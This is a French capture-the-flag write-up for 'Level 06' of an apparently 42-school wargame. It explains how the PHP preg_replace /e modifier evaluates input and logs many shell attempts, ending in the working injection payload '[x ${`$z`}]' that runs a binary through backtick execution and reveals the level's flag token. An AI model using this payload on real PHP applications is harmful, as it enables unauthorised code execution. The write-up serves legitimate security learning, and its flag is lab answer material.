# Level 06

## Recherche
---
### Explication de "rewrite"

- [x (.*)] + "y("\2")"  

- '.' match pour tous les char > .erre == verre / terre / serre  

- '\*' donne une valeur de 0 à linfini pour le caractère précédent > toto* == toto / totoo / totooo etc  

- '.*@gmail.com' > tefroiss@gmail.com, 42@gmail.com

- le flag e éxécute ce qu'il trouve dans la regex, pour ça que ça a été enlevé de php  

- la regex va remplacer par la fonction y ce qui se trouve dans la deuxième paranthèse de la regex
---

### Cheminement

Début de la recherche, il y a un fichier php lisible et son éxécutable.  
Je réécris la fonction en mode "norme" pour pouvoir lire correctement.  
Sachant qu'il y a beaucoup de preg_replace, je me dis que ce n'est pas l'élément important, ça doit être le file_get_contents.   
La fonction prend en argument y, je test donc de lancer avec y = /bin/getflag
A prévoir, on me dit que je n'ai pas les droits.   
On me dit que justement il n'y avait pas de pièges, c'est bien le preg_replace qui importe, et surtout la regex.   
Je déchiffre la regex pour plus de lisibilité (voir au dessus)
Je fais les premiers tests (voir en dessous).  
Beaucoup d'heures de recherches pour comprendre ce que je peux faire pour 'hacker' le flag.   
Le truc chiant c'est que la partie replace qui prend la deuxième parenthèse de la regex, le fout obligatoirement en string, donc tout ressort tel quel sans avoir accés.   
Il faut donc trouver la douille pour passer outre ce système.   
La réponse c'est ça : '[x ${`$z`}]'  
C'est tricky et moche mais ça marche. Le x pour la première partie inutile pour nous, $ pour la variable, qu'on imbrique dans {} et dans `` pour retirer '/bin/getflag' et non pas "/bin/getflag". Dans notre cas, le flag e va vouloir éxécuter getflag mais en tant que variable, et ne va pas y arriver.  
C'est donc grâce à l'erreur qu'on peut récuperer le flag.
On met la regex dans un fichier dans tmp, on utilise le php pour lire ce fichier qui va lui utiliser le z qui sera le getflag.

---
## Flag : wiok45aaoguiboiki2tuin6ub
---

### Résumé des tests du dernier jour

~$ echo "[x ]" > /tmp/ex06 && ./level06 /tmp/ex06


~$ echo "[x .print]" > /tmp/ex06 && ./level06 /tmp/ex06
 x print

~$ echo "[x \.print]" > /tmp/ex06 && ./level06 /tmp/ex06
\ x print

~$ echo "[x .exec90]" > /tmp/ex06 && ./level06 /tmp/ex06
 x exec90

~$ echo "[x .*]" > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
 x *

~$ echo "[x @]" > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
 y

~$ echo "[x @**]" > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
 y**

~$ echo '[x ]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag


~$ echo '[x $z]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
/bin/getflag

~$ echo "[x $z]" > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag


~$ echo '[x $z]'
[x $z]

~$ echo "[x $z]"
[x ]

~$ echo '[x $z]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
/bin/getflag

~$ echo '[x         $z]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
        /bin/getflag

~$ echo '[x        echo $z]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
       echo /bin/getflag

---

~$ echo '[x file_get_contents($z)]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
file_get_contents(/bin/getflag)

~$ echo '[x shell_exec(string $z)]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
shell_exec(string /bin/getflag)

~$ echo '[x `cat $z`]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
`cat /bin/getflag`

~$ echo '[x \`cat $z\`]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
\`cat /bin/getflag\`

~$ echo '[x \"`cat $z`\"]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
\"`cat /bin/getflag`\"

~$ echo '[x \n`cat $z`\n]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
\n`cat /bin/getflag`\n

~$ echo '[x `$z`]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
`/bin/getflag`

~$ echo '[x $z]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
/bin/getflag

~$ echo $USER
level06

~$ echo ${USER}
level06

~$ echo '[x {${z}}]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
PHP Notice:  Use of undefined constant z - assumed 'z' in /home/user/level06/level06.php(4) : regexp code on line 1
/bin/getflag

~$ echo '[x {$}z]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
PHP Parse error:  syntax error, unexpected '}', expecting T_VARIABLE or '$' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
y("{$}z") in /home/user/level06/level06.php on line 4

~$ echo '[x {${$z}}]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
PHP Notice:  Undefined variable: /bin/getflag in /home/user/level06/level06.php(4) : regexp code on line 1

~$ echo '[x {${cat $z}}]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
PHP Parse error:  syntax error, unexpected T_VARIABLE in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
y("{${cat $z}}") in /home/user/level06/level06.php on line 4

~$ echo '[x {${print $z}}]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
/bin/getflagPHP Notice:  Undefined variable: 1 in /home/user/level06/level06.php(4) : regexp code on line 1

~$ echo '[x {$`{$z}`}]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
PHP Parse error:  syntax error, unexpected '`', expecting T_VARIABLE or '$' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
y("{$`{$z}`}") in /home/user/level06/level06.php on line 4

~$ echo '[x ${`$z`}]' > /tmp/ex06 && ./level06 /tmp/ex06 /bin/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

---
# Sitographie

https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html 

https://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.double

https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing

https://www.rafaybaloch.com/2017/06/indepth-code-execution-in-php-part-two.html

https://www.agiratech.com/php-escape-quotes-how-to-do-it-right#Double_Quoted

https://www.php.net/manual/en/function.shell-exec.php

https://www.php.net/manual/en/language.operators.execution.php

https://www.w3schools.com/php/php_regex.asp


